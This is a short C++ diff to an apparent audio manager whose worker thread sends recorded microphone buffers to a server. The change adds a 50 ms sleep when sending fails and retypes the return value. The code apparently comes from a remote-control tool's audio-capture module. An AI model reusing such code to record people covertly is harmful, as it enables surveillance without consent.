@@ -59,7 +59,8 @@ DWORD CAudioManager::WorkThread(LPVOID lParam)   //发送声音到服务端
 	CAudioManager *This = (CAudioManager *)lParam;
 	while (This->m_bIsWorking)
 	{
-		This->SendRecordBuffer();   
+		if(!This->SendRecordBuffer())
+			Sleep(50);
 	}
 
 	cout<<"CAudioManager WorkThread end\n";
@@ -67,10 +68,10 @@ DWORD CAudioManager::WorkThread(LPVOID lParam)   //发送声音到服务端
 	return 0;
 }
 
-int CAudioManager::SendRecordBuffer()
+BOOL CAudioManager::SendRecordBuffer()
 {	
 	DWORD	dwBufferSize = 0;
-	DWORD	dwReturn = 0;
+	BOOL	dwReturn = 0;
 	//这里得到 音频数据
 	LPBYTE	szBuffer = m_AudioObject->GetRecordBuffer(&dwBufferSize);
 	if (szBuffer == NULL)
